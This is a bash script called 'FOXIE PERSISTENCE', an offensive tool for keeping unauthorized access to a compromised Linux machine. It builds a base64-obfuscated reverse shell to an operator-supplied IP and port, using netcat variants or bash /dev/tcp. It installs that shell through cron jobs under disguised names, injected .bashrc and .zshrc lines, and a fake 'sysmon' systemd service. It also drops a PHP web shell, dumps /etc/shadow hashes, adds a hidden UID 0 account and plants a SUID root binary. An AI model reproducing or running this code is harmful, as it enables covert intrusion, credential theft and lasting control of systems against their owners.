#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

printbanner(){
echo -e "              ${GREEN}FOXIE PERSISTENCE                "
echo -e "       ⣿⣿⣿⣯⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣽⣿⣿⣿⡇"
echo -e "       ⣿⣿⣿⣟⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠟⣻⣿⣿⡟⡇"
echo -e "       ⣿⣿⣿⣷⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠋⠀⢐⣾⣿⣿⠃⡇"
echo -e "       ⡇⣿⣿⣿⠭⠥⠄⠈⠻⣷⣦⣤⣶⣦⣤⣤⣴⣶⣤⣴⣿⠋⠀⠠⠭⢭⣿⣿⣿⠀⡇"
echo -e "       ⡇⢻⣿⣿⣿⣶⢖⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣲⣾⣿⣿⣿⡏⠀⡇"
echo -e "       ⡇⠈⢿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢿⣿⡟⠀⠀⡇"
echo -e "       ⡇⠀⢸⣟⢜⣿⣿⡿⣟⠟⠉⠉⠛⣿⣿⣿⣟⠋⠁⠈⠙⣻⢿⣿⣿⡸⣿⠁⠀⠀⡇"
echo -e "       ⡇⠀⣸⣿⣿⡿⠋⠉⠁⣀⣐⠢⣄⢸⣿⣿⠀⣠⢖⣂⣀⠈⠉⠛⢿⣿⣿⣄⠀⠀⡇"
echo -e "       ⡇⣼⣿⣿⣿⡷⡋⢰⠟⠻⣽⣷⢿⣿⣿⣿⣿⣷⣿⣿⠟⢳⡈⠹⣾⣿⣿⣿⣆⠀⡇"
echo -e "       ⡇⢾⣿⣿⣿⣏⠀⢸⣶⠀⠀⠀⠀⣿⣿⣿⠻⣆⠀⠀⢀⣼⡇⢈⢿⣿⣿⣿⣧⠀⡇"
echo -e "       ⡇⢻⣿⣿⣿⣯⢂⣼⣿⣷⣷⣇⣼⣿⣿⣿⠅⢸⣾⣷⣿⣿⣆⣠⣿⣿⣿⣿⡷⠀⡇"
echo -e "       ⡇⢪⢿⣿⣿⣿⣿⣿⡿⢹⣿⣿⣿⡿⠭⠅⠀⡄⡿⠉⠙⢿⣿⣿⣿⣿⣿⡿⡁⠀⡇"
echo -e "       ⡇⠀⠞⣿⣿⣿⣿⣿⣧⠈⢿⣿⡏⣿⣶⣿⠄⣧⠃⠀⢀⣵⣿⣿⣿⣿⡏⠇⠀⠀⡇"
echo -e "       ⡇⠀⠀⠘⠹⡟⣿⣿⣿⣷⣾⣿⣿⣬⠽⢭⡴⠁⠀⣰⣿⣿⣿⣿⢻⠿⠃⠀⠀⠀⡇"
echo -e "       ⡇⠀⠀⠀⠀⠀⠙⢿⢿⣿⣿⣿⢠⢉⠉⠉⠀⠀⡆⣿⣿⣿⡟⠃⠀⠀⠀⠀⠀⠀⡇"
echo -e "       ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣼⣼⢸⣰⣸⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⡇"
echo -e "       ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇"
echo -e "       ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇"
echo -e "       ⣿⣿⣿⣯⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣽⣿⣿⣿⡇"
}

rootcrontab() {
  echo -e "${GREEN}INFO: Root crontab module started."
  chmod +x /usr/sbin/anacron
  $encoded_command_with_decode > /usr/sbin/anacron
  chmod +x /usr/sbin/anacron
  echo "* * * * * root /usr/sbin/anacron" | sudo tee -a /etc/crontab > /dev/null
  (crontab -l ; echo "* * * * * /usr/sbin/anacron") | crontab -
  echo -e "${GREEN}INFO: Root crontab module is succesfull. Entry: * * * * * root /usr/sbin/anacron"
}

usercrontab(){
  echo -e "${GREEN}INFO: Usercrontab module started."
  if [ -w "/usr/sbin/anacron" ]; then
    chmod +x /usr/sbin/anacron
    $encoded_command_with_decode > /usr/sbin/anacron
    (crontab -l ; echo "* * * * * /usr/sbin/anacron") | crontab -
    chmod +x /usr/sbin/anacron
    echo -e "${GREEN}INFO: User crontab module is succesfull. Entry: * * * * * /usr/sbin/anacron"
  else
    echo -e "${RED}ALERT: User permissions not enough write to /usr/sbin/anacron. I will try /usr/sbin/anarcon! "
    $encoded_command_with_decode > /usr/sbin/anarcon
    (crontab -l ; echo "* * * * * /usr/sbin/anarcon") | crontab -
    chmod +x /usr/sbin/anarcon
    echo -e "${GREEN}INFO: User crontab module is succesfull. Entry: * * * * * /usr/sbin/anarcon"
  fi
}

bashRCPersistence() {
  echo -e "${GREEN}INFO: .bashrc Persistence module started."
  bashrc_file="$HOME/.bashrc"
  zshrc_file="$HOME/.zshrc"
  if [ -f "$bashrc_file" ]; then
    sed -i '30i'"echo \"$encoded_command_with_decode\""'' "$HOME/.bashrc"
    echo -e "${GREEN}INFO: .bashrc Persistence worked on $HOME/.bashrc."
  elif [ -f "$zshrc_file" ]; then
    sed -i '30i'"echo \"$encoded_command_with_decode\""'' "$HOME/.zshrc"
    echo -e "${GREEN}INFO: .bashrc Persistence worked on $HOME/.zshrc."
  else
    echo -e "${RED}ALERT: Do it manual! (.bashrc Persistence) $SHELL ${NC}"
  fi
  if [ "$(id -u)" -eq 0 ]; then
    echo -e "${RED}INFO: It looks like you are root! Maybe you wanna copy payload to some common user folder? Y/N ${NC}"
    read -r answer
    if [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then
      echo -e "${RED}INPUT: Please select username from this list. It must be common username, do not make typo."
      ls /home/
      read -r usernameofbashrc
      if [ -f "/home/$usernameofbashrc/.bashrc" ]; then
      sed -i '30i'"echo \"$encoded_command_with_decode\""'' "/home/$usernameofbashrc/.bashrc"
      echo -e "${GREEN}INFO: Succesfull."
      else
      echo -e "${RED}ALERT: Invalid Username"
      fi
    else
      echo "${RED}ALERT: Skipped User BashRC Persistence"
   fi
   fi
}

phpfuck(){
  echo -e "${GREEN}INFO: Starting PHP /var/www/html persistence module."
  dizin="/var/www/html"
  if [ -w "$dizin" ]; then
    echo "<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>" > /var/www/html/logon.php
    echo -e "${GREEN}INFO: PHP /var/www/html/logon.php persistence is succesfull. You can reach with ?cmd= parameter."
  else
    echo -e "${RED}ALERT: PHP persistence is not successfull! There is no folder."
  fi
}

shadow() {
    echo -e "${GREEN}INFO: Starting Shadow Module."
    if $(find /etc/shadow -readable | grep -qi shadow)
    then
        echo -e "${GREEN}INFO: Accounts with Passwords from /etc/shadow ${nc}"
        egrep -v "\*|\!" /etc/shadow
    else
        echo -e "${RED}ALERT: You Cannot READ /etc/shadow ${NC}"
    fi
}

newuseradd(){
  echo -e "${GREEN}INFO: Starting New User module.${NC}"
  echo -e "${RED}INPUT: Please select password for your new user: ${NC}"
  read -r userpass
  if grep -q "^_redis:" /etc/passwd; then
    echo -e "${RED}INPUT: There is already user with name '_redis'. Please select other username for persistence: ${NC}"
    read username
    sudo useradd -ou 0 -g 0 $username
    echo "$username:$userpass" | chpasswd
    echo -e "${GREEN}INFO: Sucessfully created account! Username: $username Password: $userpass ${NC}"
  else
     sudo useradd -ou 0 -g 0 _redis
     echo "_redis:$userpass" | chpasswd
     echo -e "${GREEN}INFO: Sucessfully created account! Username: _redis Password: $userpass ${NC}"
  fi
}
suidbinaries(){
  echo -e "${GREEN}INFO: Starting SUID Binaries module.${NC}"
  if [ -e croissant ]; then
    cp croissant /usr/sbin/groub_install
    chown root:root /usr/sbin/groub_install
    chmod 4777 /usr/sbin/groub_install
    echo -e "${GREEN}INFO: SUID Binaries module is succesfull. You can SUID Binary at /usr/sbin/groub_install ${NC}"
  else
    echo -e "${RED}ALERT: Cannot find 'croissant' binary on this directory.${NC}"
  fi
}
createservice(){
  echo -e "${RED}INPUT: Enter the service name for the persistence service; leave it empty for the name 'sysmon' ${NC}"
  read -r servicename
  echo -e "${GREEN}INFO: Starting create service module."
  if [ -z "$servicename" ]; then
    servicename="sysmon"
  fi
  echo -e "[Unit]" > /etc/systemd/system/$servicename
  echo -e "Description=The service logs events immediately and the driver installs as a boot-start driver to capture activity from early in the boot that the service will write to the event log when it starts." >> /etc/systemd/system/$servicename.service
  echo -e "Documentation=man:$servicename(8) man:$servicename.conf(5)" >> /etc/systemd/system/$servicename.service
  echo -e "ConditionVirtualization=no" >> /etc/systemd/system/$servicename.service
  echo -e "[Service]" >> /etc/systemd/system/$servicename.service
  echo -e "ExecStart=while true; do ($encoded_command_with_decode) & sleep 30; done" >> /etc/systemd/system/$servicename.service
  echo "[Install]" >> /etc/systemd/system/$servicename.service
  echo -e "WantedBy=multi-user.target" >> /etc/systemd/system/$servicename.service
  sudo systemctl enable $servicename
  sudo systemctl start $servicename
  echo -e "${GREEN}INFO: Create Service module is succesfull. Service name is $servicename."
}

main(){
  printbanner
  echo -e "${RED}INPUT: Enter IP for Listening: "
  read -r ipadd

  echo -e "${RED}INPUT: Enter PORT for Listening: "
  read -r portadd

  random_string=$(cat /proc/sys/kernel/random/boot_id) && random_string2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
  folder_name=systemd-private-$random_string-systemd.service-$random_string2

  if command -v ncat &> /dev/null; then
    encoded_command='"'
    encoded_command+=$(echo "(ncat -c /bin/bash $ipadd $portadd 0>&1 1>&2 & disown) 2>/dev/null"|base64)
    encoded_command+='"'
    encoded_command=$(echo $encoded_command |sed 's/ //g')
    encoded_command=$(echo echo $encoded_command)
  elif command -v nc &> /dev/null; then
    encoded_command='"'
    encoded_command=$(echo "(nc -c /bin/bash $ipadd $portadd 0>&1 1>&2 & disown) 2>/dev/null"|base64)
    encoded_command+='"'
    encoded_command=$(echo $encoded_command |sed 's/ //g')
    encoded_command=$(echo echo $encoded_command)
  elif command -v netcat &> /dev/null; then
    encoded_command='"'
    encoded_command=$(echo "(netcat -c /bin/bash $ipadd $portadd 0>&1 1>&2 & disown) 2>/dev/null"|base64)
    encoded_command+='"'
    encoded_command=$(echo $encoded_command |sed 's/ //g')
    encoded_command=$(echo echo $encoded_command)
  else
    encoded_command='"'
    encoded_command=$(echo "(bash -i >& /dev/tcp/$ipadd/$portadd 0>&1 & disown)"|base64)
    encoded_command+='"'
    encoded_command=$(echo $encoded_command |sed 's/ //g')
    encoded_command=$(echo echo $encoded_command)

  fi
  encoded_command_with_decode="echo $encoded_command|base64 -d|bash"
  mkdir /tmp/$folder_name
  cd /tmp/$folder_name

  if [ "$(id -u)" -eq 0 ]; then
    echo -e "${GREEN}INFO: It looks like you are root! Trying all root persistence modes.${NC}"
    pers_mode=1
  else
    echo -e "${GREEN}INFO: It looks like you are not root. Trying all user persistence modes.${NC}"
    pers_mode=0
  fi
  if [ "$pers_mode" -eq 1 ]; then
    echo -e "${GREEN}INFO: Starting root persistence mode."
    createservice
    suidbinaries
    newuseradd
    phpfuck
    shadow
    bashRCPersistence
    rootcrontab
  else
    echo -e "${GREEN}INFO: Starting user persistence mode."
    phpfuck
    shadow
    bashRCPersistence
    usercrontab
  fi
}

main
